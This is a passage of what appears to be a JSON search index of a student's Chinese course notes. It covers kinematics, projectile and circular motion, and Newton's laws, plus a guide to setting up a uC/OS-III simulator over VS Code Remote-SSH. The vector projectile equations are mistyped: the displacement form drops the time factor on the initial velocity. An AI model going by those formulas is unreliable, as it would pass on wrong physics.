1.3.3. \u89d2\u901f\u5ea6 1.3.4. \u89d2\u52a0\u901f\u5ea6 1.3.5. \u7ebf\u901f\u5ea6\u4e0e\u89d2\u901f\u5ea6\u4e4b\u95f4\u7684\u5173\u7cfb 1.3.6. \u5207\u5411\u52a0\u901f\u5ea6\u4e0e\u89d2\u52a0\u901f\u5ea6\u4e4b\u95f4\u7684\u5173\u7cfb 1.3.7. \u6cd5\u5411\u52a0\u901f\u5ea6\u4e0e\u89d2\u901f\u5ea6\u4e4b\u95f4\u7684\u5173\u7cfb 2. \u725b\u987f\u8fd0\u52a8\u5b9a\u5f8b\u53ca\u5176\u5e94\u7528 2.1. \u725b\u987f\u7b2c\u4e00\u5b9a\u7406 - \u60ef\u6027\u5b9a\u5f8b 2.2. \u725b\u987f\u7b2c\u4e8c\u5b9a\u5f8b 2.3. \u725b\u987f\u7b2c\u4e09\u5b9a\u5f8b 2.4. \u89e3\u9898\u6b65\u9aa4 2.5. \u60ef\u6027\u529b","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#1","text":"","title":"1. \u8d28\u70b9\u8fd0\u52a8\u5b66"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#11","text":"","title":"1.1. \u8d28\u70b9\u8fd0\u52a8\u7684\u63cf\u8ff0"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#111","text":"\\overrightarrow{r}","title":"1.1.1. \u4f4d\u7f6e\u77e2\u91cf"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#112","text":"\\Delta \\overrightarrow{r}","title":"1.1.2. \u4f4d\u79fb"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#113","text":"\\overrightarrow{r}(t)","title":"1.1.3. \u8fd0\u52a8\u51fd\u6570"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#114","text":"x = x_0 + v_0 t + \\frac{1}{2} at^2 v^2 - v_0^2 = 2a(x - x_0)","title":"1.1.4. \u5300\u52a0\u901f\u76f4\u7ebf\u8fd0\u52a8\u7684\u8fd0\u52a8\u65b9\u7a0b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#115","text":"\\overrightarrow{v} = \\dfrac{d \\overrightarrow{r}}{d {t}}","title":"1.1.5. \u901f\u5ea6"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#116","text":"\\overrightarrow{a} = \\dfrac{d \\overrightarrow{v}}{d{t}} = \\dfrac{d^2 \\overrightarrow{r}}{d {t}^2}","title":"1.1.6. \u52a0\u901f\u5ea6"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#12","text":"","title":"1.2. \u629b\u4f53\u8fd0\u52a8"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#121","text":"\u4ee5 \\overrightarrow{v_0} \u8868\u793a\u7269\u4f53\u7684\u521d\u901f\u5ea6\uff0c\u4ee5 \\theta_0 \u8868\u793a\u629b\u5c04\u89d2\uff0c\u5219 \\overrightarrow{v_0} \u5728 Ox \u548c Oy \u8f74\u4e0a\u7684\u5206\u91cf\u662f v_{0x} = v_0 \\cos \\theta_0 v_{0y} = v_0 \\sin \\theta_0 \u8fd0\u52a8\u5b66\u65b9\u7a0b\u4e3a \\overrightarrow{r} = (v_0 \\cos \\theta_0 i + v_0 \\sin \\theta_0)t - \\frac{1}{2} gt^2 j \u4f7f\u7528\u77e2\u91cf \\overrightarrow{v_0} \u548c \\overrightarrow{g} \u6765\u8868\u793a\uff0c\u5219\u4e0a\u5f0f\u53ef\u5199\u6210 \\overrightarrow{r} = \\overrightarrow{v_0} + \\frac{1}{2} \\overrightarrow{g}t^2","title":"1.2.1. \u8fd0\u52a8\u65b9\u7a0b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#122","text":"\u82e5\u6d88\u53bb\u8fd0\u52a8\u65b9\u7a0b\u4e2d\u7684 t \uff0c\u5219\u5f97\u629b\u4f53\u7684\u8f68\u8ff9\u65b9\u7a0b\u4e3a y = x\\tan \\theta_0 - \\frac{1}{2} \\frac{gx^2}{v_0^2 \\cos^2 \\theta_0} \u5219\u629b\u4f53\u8fd0\u52a8\u7684\u5c04\u7a0b\u4e3a x_m = \\frac{v_0^2 \\sin 2\\theta_0}{g} \u5c04\u9ad8\u4e3a y_m = \\frac{v_0^2 \\sin ^2\\theta_0}{2g} \u5f53 y = y_m \u65f6\uff0c x = \\dfrac{1}{2}x_m \uff0c\u5373\u5c04\u7a0b\u7684\u4e00\u534a\u3002","title":"1.2.2. \u5c04\u7a0b\u4e0e\u5c04\u9ad8"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#13","text":"","title":"1.3. \u5706\u5468\u8fd0\u52a8"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#131","text":"a_t = \\dfrac{d v}{d t} e_t","title":"1.3.1. \u5207\u5411\u52a0\u901f\u5ea6"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#132","text":"a_n = \\dfrac{v^2}{R} e_n","title":"1.3.2. \u6cd5\u5411\u52a0\u901f\u5ea6"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#133","text":"\\omega = \\lim\\limits_{\\Delta t \\to 0}{\\frac{\\Delta \\theta}{\\Delta t}} = \\dfrac{d \\theta}{d t}","title":"1.3.3. \u89d2\u901f\u5ea6"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#134","text":"\\alpha = \\lim\\limits_{\\Delta t \\to 0}{\\frac{\\Delta \\omega}{\\Delta t}} = \\dfrac{d \\omega}{d t}","title":"1.3.4. \u89d2\u52a0\u901f\u5ea6"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#135","text":"v = R \\omega","title":"1.3.5. \u7ebf\u901f\u5ea6\u4e0e\u89d2\u901f\u5ea6\u4e4b\u95f4\u7684\u5173\u7cfb"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#136","text":"a_t = R \\alpha","title":"1.3.6. \u5207\u5411\u52a0\u901f\u5ea6\u4e0e\u89d2\u52a0\u901f\u5ea6\u4e4b\u95f4\u7684\u5173\u7cfb"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#137","text":"a_n = \\dfrac{v^2}{R} = v \\omega = R \\omega^2","title":"1.3.7. \u6cd5\u5411\u52a0\u901f\u5ea6\u4e0e\u89d2\u901f\u5ea6\u4e4b\u95f4\u7684\u5173\u7cfb"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#2","text":"","title":"2. \u725b\u987f\u8fd0\u52a8\u5b9a\u5f8b\u53ca\u5176\u5e94\u7528"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#21-","text":"\u5b9a\u4e49 \uff1a\u4efb\u4f55\u7269\u4f53\uff0c\u5982\u679c\u6ca1\u6709\u529b\u4f5c\u7528\u5728\u5b83\u4e0a\u9762\uff0c\u90fd\u5c06\u4fdd\u6301\u5176\u901f\u5ea6\u3002\u9759\u6b62\u7684\u4ecd\u7136\u9759\u6b62\uff0c\u8fd0\u52a8\u7684\u5c06\u505a\u5300\u901f\u76f4\u7ebf\u8fd0\u52a8\u3002","title":"2.1. \u725b\u987f\u7b2c\u4e00\u5b9a\u7406 - \u60ef\u6027\u5b9a\u5f8b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#22","text":"\\overrightarrow{F} = m \\overrightarrow{a} \u5b9a\u4e49 \uff1a\u8d28\u70b9\u7684\u52a0\u901f\u5ea6\u4e0e\u5b83\u6240\u53d7\u7684\u5408\u529b\u7684\u65b9\u5411\u5411\u540c\uff0c\u52a0\u901f\u5ea6\u7684\u5927\u5c0f\u4e0e\u5b83\u7684\u8d28\u91cf\u6210\u53cd\u6bd4\uff0c\u4e0e\u5b83\u6240\u53d7\u7684\u5408\u529b\u6210\u6b63\u6bd4\u3002 \\overrightarrow{F} = \\frac{d \\overrightarrow{p}}{d t} \u5b9a\u4e49 \uff1a\u7269\u4f53\u7684\u52a8\u91cf\u5bf9\u65f6\u95f4\u7684\u53d8\u5316\u7387\u4e0e\u6240\u53d7\u7684\u5916\u529b\u6210\u6b63\u6bd4\uff0c\u5e76\u53d1\u751f\u5728\u5916\u529b\u7684\u65b9\u5411\u4e0a\u3002","title":"2.2. \u725b\u987f\u7b2c\u4e8c\u5b9a\u5f8b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#23","text":"\u5b9a\u4e49 \uff1a\u7269\u4f53\u95f4\u7684\u4f5c\u7528\u529b\u6210\u5bf9\u51fa\u73b0\u3002\u901a\u5e38\u6210\u4e3a\u4f5c\u7528\u529b\u4e0e\u53cd\u4f5c\u7528\u529b\u3002 \\overrightarrow F_{AB} = - \\overrightarrow F_{BA}","title":"2.3. \u725b\u987f\u7b2c\u4e09\u5b9a\u5f8b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#24","text":"\u9009\u5b9a\u5bf9\u8c61\uff0c\u9694\u79bb\u7269\u4f53 \u53d7\u529b\u5206\u6790\uff0c\u753b\u793a\u529b\u56fe \u5206\u6790\u8fd0\u52a8 \u9009\u5750\u6807\u7cfb\uff0c\u5217\u65b9\u7a0b\uff0c\u6c42\u89e3\u672a\u77e5\u91cf \u68c0\u9a8c\u4e0e\u8ba8\u8bba","title":"2.4. \u89e3\u9898\u6b65\u9aa4"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%A4%A7%E5%AD%A6%E7%89%A9%E7%90%86/1.%E7%AC%AC%E4%B8%80%E7%AB%A0_%E8%BF%90%E5%8A%A8%E5%92%8C%E5%8A%9B/#25","text":"\u60ef\u6027\u529b\uff08Inertial force\uff09\u7684\u5927\u5c0f\u7b49\u4e8e\u7269\u4f53\u7684\u8d28\u91cf m \u548c\u975e\u60ef\u6027\u7cfb\u52a0\u901f\u5ea6 a \u7684\u4e58\u79ef\uff0c\u4f46\u65b9\u5411\u548c a \u76f8\u53cd\u3002\u5982\u679c\u7528 F_i \u8868\u793a\u60ef\u6027\u529b\uff0c\u5219 F_i = -ma","title":"2.5. \u60ef\u6027\u529b"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/1.uCos%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/","text":"uC/OS\u73af\u5883\u914d\u7f6e # \u57fa\u4e8eMac OS\u3001VS Code Remote\u548c\u963f\u91cc\u4e91Ubuntu\u670d\u52a1\u5668\u7684uC/OS-III\u4eff\u771f\u73af\u5883\u914d\u7f6e \u76ee\u5f55 # uC/OS\u73af\u5883\u914d\u7f6e \u76ee\u5f55 1. \u80cc\u666f 2. \u51c6\u5907\u5de5\u4f5c 3. \u914d\u7f6e\u6b65\u9aa4 3.1. \u914d\u7f6e\u670d\u52a1\u5668 3.2. \u914d\u7f6eVS Code 1. \u80cc\u666f # \u8fd9\u5b66\u671f\u9009\u4e86\u4e00\u95e8\u8bfe\u53eb\u300a\u5d4c\u5165\u5f0f\u7cfb\u7edf\u300b\uff0c\u8001\u5e08\u8ba9\u6211\u4eec\u7528 a\u7cfb\u7edf \u6765\u505a\u4eff\u771f\u3002\u4f46\u6211\u53d1\u73b0\u73b0\u6709\u7684\u4eff\u771f\u5e73\u53f0\u90fd\u662f\u57fa\u4e8eWindows\u7684\uff0c\u6bd4\u5982 Keil \uff0cuC/OS\u5b98\u65b9\u4e5f\u51fa\u4e86 \u57fa\u4e8eLinux\u7684\u7cfb\u7edf\u7248\u672c \uff0c\u4f46\u662f\u7ed9\u7684\u6587\u4ef6\u662f\u4e00\u4e2aEclipse Project\uff0c\u6240\u4ee5\u9700\u8981\u5b89\u88c5\u4e86GUI\u754c\u9762\u624d\u6bd4\u8f83\u597d\u6253\u5f00\uff0c\u7528\u670d\u52a1\u5668\u4e5f\u4e0d\u597d\u64cd\u4f5c\uff0c\u603b\u4e4b\u5bf9Mac\u5341\u5206\u5730\u4e0d\u53cb\u597d:imp:\u3002 \u4e8e\u662f\u6211\u8fdb\u884c\u4e86\u4e00\u756a\u641c\u7d22\uff0c\u641c\u7d22\u8303\u56f4\u56ca\u62ec\u4e86\u767e\u5ea6\u3001CSDN\u3001\u77e5\u4e4e\u3001BiliBili\u3001XXXXHub\u7b49\u4f17\u591a\u7a0b\u5e8f\u5458\u7ecf\u5e38\u51fa\u6ca1\u7684\u5730\u65b9\uff0c\u90fd\u6ca1\u6709\u627e\u5230\u4e00\u4e2a\u6bd4\u8f83\u597d\u7684\u89e3\u51b3\u65b9\u6848\u3002\u6700\u540e\uff0c\u8fd8\u662f\u5728\u5927\u578b\u4ea4\u53cb\u793e\u533aGithub\u4e0a\u627e\u5230\u4e86\u4e00\u4f4d \u4e0a\u6d77\u7684Cisco\u5de5\u7a0b\u5e08 \u5f00\u6e90\u7684\u9879\u76ee\uff0c\u4ed6\u57fa\u4e8euC/OS\u5b98\u65b9\u7684Linux\u7248\u672c\u4eff\u771f\u4ee3\u7801\uff0c\u5199\u4e86\u4e00\u4e2a \u53ef\u4ee5\u7528\u547d\u4ee4\u884c\u64cd\u4f5c\u7684\u7248\u672c \u3002 \u6211\u770b\u5230\u4e4b\u540e\u90fd\u5feb\u54ed\u4e86\uff0c\u7ec8\u4e8e\u4e0d\u7528\u9000\u8bfe\u4e86:sob:\u3002\u628a\u8fd9\u4f4d\u5927\u4f6c\u7684\u9879\u76eeFork\u8fc7\u6765\u4ee5\u540e\uff0c\u56e0\u4e3a\u505a\u5b9e\u9a8c\u9700\u8981\u7ecf\u5e38\u8c03\u8bd5\uff0c\u6211\u628a\u547d\u4ee4\u884c\u7528Makefile\u518d\u7b80\u5316\u4e86\u4e00\u70b9\uff0c\u653e\u5728\u4e86 \u6211\u7684Github\u4e0a \u3002\u6b22\u8fce\u5927\u5bb6Star/Fork\uff0c~~\u6c42\u4f60\u4eec\u4e86~~\u3002 2. \u51c6\u5907\u5de5\u4f5c # \u8981\u5b8c\u6210\u672c\u7bc7\u6587\u7ae0\u4e2d\u6240\u8bf4\u7684\u914d\u7f6e\u5de5\u4f5c\uff0c\u4f60\u9700\u8981\u6709 \u4e00\u53f0MacBook\u3002\u5176\u5b9e\u5565\u7535\u8111\u90fd\u884c\uff0c\u4f46\u6211\u4eec\u4e3b\u8981\u60f3\u89e3\u51b3\u7684\u8fd8\u662f\u5728Mac\u4e0a\u8fdb\u884cuC/OS\u4eff\u771f\u7684\u95ee\u9898\u3002 VS Code \u3002\u5176\u5b9e\u5176\u4ed6IDE\u3001\u7f16\u8f91\u5668\u53ea\u8981\u652f\u6301SSH\u8fde\u63a5\u4e5f\u90fd\u53ef\u4ee5\uff0c~~\u4f46\u6211\u89c9\u5f97VS Code\u5929\u4e0b\u7b2c\u4e00~~\u3002 VS Code \u63d2\u4ef6 Remote - SSH \uff0c\u5fae\u8f6f\u5b98\u65b9\u5f00\u53d1\u7684SSH\u63d2\u4ef6\u3002 \u4e00\u53f0Ubuntu\u670d\u52a1\u5668\u3002\u6211\u4f7f\u7528\u7684\u662f\u963f\u91cc\u4e91\u7684 \u5b66\u751f\u670d\u52a1\u5668 \uff0c\u4e00\u5e74\u53ea\u8981100\u591a\uff0c\u4f60\u4e70\u4e86\u4e0d\u5403\u4e8f\uff0c\u4f60\u4e70\u4e86\u4e0d\u4e0a\u5f53\u3002 3. \u914d\u7f6e\u6b65\u9aa4 # 3.1. \u914d\u7f6e\u670d\u52a1\u5668 # \u5b89\u88c5CMake sudo apt install cmake \u4eceGithub\u4e0a\u4e0b\u8f7d\u6e90\u4ee3\u7801\u5230\u670d\u52a1\u5668\u3002 \u5728\u4f60\u60f3\u8981\u5b89\u88c5\u7684\u76ee\u5f55\u4e0b\u8f93\u5165\u547d\u4ee4 git clone https://github.com/CurrenWong/ucos3-posix.git \u8fdb\u5165\u9879\u76ee\u6587\u4ef6\u5939 cd ucos3-posix \u6784\u5efa\u9879\u76ee make \u6784\u5efa\u5b8c\u6210\u4ee5\u540e\u4f1a\u5728\u6700\u540e\u4e00\u884c\u8f93\u51fa Done \u3002 \u8fd0\u884c\u9879\u76ee\u68c0\u67e5\u662f\u5426\u5b89\u88c5\u6210\u529f make run \u770b\u5230 uCos-III is running \u65f6\u5c31\u8bf4\u660e\u914d\u7f6e\u5b8c\u6210\u4e86:sparkles:\u3002\u7528Ctrl-C\u505c\u6389\u8fd0\u884c\u4e2d\u7684\u9879\u76ee\u5c31\u53ef\u4ee5\u4e86\u3002 \u4f46\u662f\uff0c\u5728\u547d\u4ee4\u884c\u754c\u9762\u91cc\u5199\u4ee3\u7801\u4f53\u9a8c\u8fd8\u662f\u7a0d\u5fae\u5dee\u4e86\u4e00\u70b9\uff0c\u9664\u975e\u662f\u7cbe\u901aVim\u7684\u5927\u4f6c\u3002\u6240\u4ee5\u63a5\u4e0b\u6765\u6211\u4eec\u4f1a\u901a\u8fc7\u914d\u7f6eVS Code\u6765\u5b9e\u73b0\u8fdc\u7a0bSSH\uff0c\u8fd9\u6837\u5c31\u80fd\u591f\u5728\u672c\u5730\u7684VS Code\u4e0a\u5199\u4ee3\u7801\uff0c\u5e76\u4e14\u5728\u670d\u52a1\u5668\u4e0a\u8fd0\u884c\u4e86\u3002 3.2. \u914d\u7f6eVS Code # \u4e0b\u8f7dRemote ssh\u63d2\u4ef6 \u5728\u6269\u5c55\u5546\u5e97\u4e2d\u641c\u7d22 remote ssh \uff0c\u51fa\u6765\u7b2c\u4e00\u4e2a\u5c31\u662f\u6211\u4eec\u9700\u8981\u7684\u63d2\u4ef6\uff0c\u70b9\u51fbInstall\u5b89\u88c5\u5373\u53ef\u3002 \u5982\u679c\u6ca1\u6709\u88c5C\u8bed\u8a00\u6269\u5c55\u7684\u8bdd\uff0c\u518d\u88c5\u4e00\u4e2a C/C++ \uff0c\u4e5f\u662f\u5fae\u8f6f\u5b98\u65b9\u7684\u63d2\u4ef6\u3002 \u914d\u7f6essh\u8fde\u63a5 \u4e0b\u8f7d\u597dremote ssh\u4ee5\u540e\uff0c\u5de6\u4e0b\u89d2\u4f1a\u6709\u4e00\u4e2a\u7eff\u8272\u7684\u6807\u8bb0\uff0c\u70b9\u51fb\u8fd9\u4e2a\u6807\u8bb0\u3002 \u8fd9\u65f6\u4f1a\u5f39\u51fa\u4e00\u4e2a\u83dc\u5355\uff0c\u8ba9\u4f60\u9009\u62e9\u505a\u4ec0\u4e48\u64cd\u4f5c\u3002\u4e3a\u4e86\u4e4b\u540e\u8fde\u63a5\u65b9\u4fbf\uff0c\u6211\u4eec\u76f4\u63a5\u628a\u7528\u6237\u540d\u548c\u670d\u52a1\u5668IP\u5199\u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u3002 \u9996\u5148\u9009\u62e9Open Configure File \u7136\u540e\u9009\u62e9 xxx/.ssh/config \u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u586b\u5165\u4f60\u7684\u4e3b\u673a\u6635\u79f0\uff08Host\uff09\u3001\u670d\u52a1\u5668IP\uff08HostName\uff09\u548c\u767b\u9646\u7528\u6237\u540d\uff08User\uff09 \u4fdd\u5b58\u4ee5\u540e\uff0c\u518d\u70b9\u51fb\u4e00\u4e0b\u7a97\u53e3\u5de6\u4e0b\u89d2\u7684\u7eff\u8272\u6807\u8bb0\uff0c\u5f39\u51faVs Code\u7684\u547d\u4ee4\u7a97\u53e3\uff0c\u9009\u62e9 Connect to Host \uff0c\u5728\u9009\u62e9\u6211\u4eec\u521a\u521a\u521b\u5efa\u7684\u4e3b\u673a\u3002 \u8fd9\u65f6\u4f1a\u5f39\u51fa\u4e00\u4e2a\u65b0\u7684\u7a97\u53e3\uff0c\u8f93\u5165\u8fde\u63a5\u5bc6\u7801\u4ee5\u540e\uff0c\u6211\u4eec\u5c31\u5927\u529f\u544a\u6210\u4e86\u3002 \u8fdb\u5165\u6211\u4eec\u5728\u670d\u52a1\u5668\u4e0a\u914d\u7f6e\u7684uC/OS\u8def\u5f84\uff0c\u7f16\u8f91app.c\uff0c\u6109\u5feb\u5730\u8fdb\u884cuC/OS\u4eff\u771f\u5427\uff01:+1:\u3002 \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.uCos\u73af\u5883\u914d\u7f6e"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/1.uCos%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/#ucos","text":"\u57fa\u4e8eMac OS\u3001VS Code Remote\u548c\u963f\u91cc\u4e91Ubuntu\u670d\u52a1\u5668\u7684uC/OS-III\u4eff\u771f\u73af\u5883\u914d\u7f6e","title":"uC/OS\u73af\u5883\u914d\u7f6e"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/1.uCos%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/#_1","text":"uC/OS\u73af\u5883\u914d\u7f6e \u76ee\u5f55 1. \u80cc\u666f 2. \u51c6\u5907\u5de5\u4f5c 3. \u914d\u7f6e\u6b65\u9aa4 3.1. \u914d\u7f6e\u670d\u52a1\u5668 3.2. \u914d\u7f6eVS Code","title":"\u76ee\u5f55"},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/%E5%B5%8C%E5%85%A5%E5%BC%8F%E7%B3%BB%E7%BB%9F/1.uCos%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/#1","text":"\u8fd9\u5b66\u671f\u9009\u4e86\u4e00\u95e8\u8bfe\u53eb\u300a\u5d4c\u5165\u5f0f\u7cfb\u7edf\u300b\uff0c\u8001\u5e08\u8ba9\u6211\u4eec\u7528 a\u7cfb\u7edf \u6765\u505a\u4eff\u771f\u3002\u4f46\u6211\u53d1\u73b0\u73b0\u6709\u7684\u4eff\u771f\u5e73\u53f0\u90fd\u662f\u57fa\u4e8eWindows\u7684\uff0c\u6bd4\u5982 Keil \uff0cuC/OS\u5b98\u65b9\u4e5f\u51fa\u4e86 \u57fa\u4e8eLinux\u7684\u7cfb\u7edf\u7248\u672c \uff0c\u4f46\u662f\u7ed9\u7684\u6587\u4ef6\u662f\u4e00\u4e2aEclipse Project\uff0c\u6240\u4ee5\u9700\u8981\u5b89\u88c5\u4e86GUI\u754c\u9762\u624d\u6bd4\u8f83\u597d\u6253\u5f00\uff0c\u7528\u670d\u52a1\u5668\u4e5f\u4e0d\u597d\u64cd\u4f5c\uff0c\u603b\u4e4b\u5bf9Mac\u5341\u5206\u5730\u4e0d\u53cb\u597d:imp:\u3002 \u4e8e\u662f\u6211\u8fdb\u884c\u4e86\u4e00\u756a\u641c\u7d22\uff0c\u641c\u7d22\u8303\u56f4\u56ca\u62ec\u4e86\u767e\u5ea6\u3001CSDN\u3001\u77e5\u4e4e\u3001BiliBili\u3001XXXXHub\u7b49\u4f17\u591a\u7a0b\u5e8f\u5458\u7ecf\u5e38\u51fa\u6ca1\u7684\u5730\u65b9\uff0c\u90fd\u6ca1\u6709\u627e\u5230\u4e00\u4e2a\u6bd4\u8f83\u597d\u7684\u89e3\u51b3\u65b9\u6848\u3002\u6700\u540e\uff0c\u8fd8\u662f\u5728\u5927\u578b\u4ea4\u53cb\u793e\u533aGithub\u4e0a\u627e\u5230\u4e86\u4e00\u4f4d \u4e0a\u6d77\u7684Cisco\u5de5\u7a0b\u5e08 \u5f00\u6e90\u7684\u9879\u76ee\uff0c\u4ed6\u57fa\u4e8euC/OS\u5b98\u65b9\u7684Linux\u7248\u672c\u4eff\u771f\u4ee3\u7801\uff0c\u5199\u4e86\u4e00\u4e2a \u53ef\u4ee5\u7528\u547d\u4ee4\u884c\u64cd\u4f5c\u7684\u7248\u672c \u3002 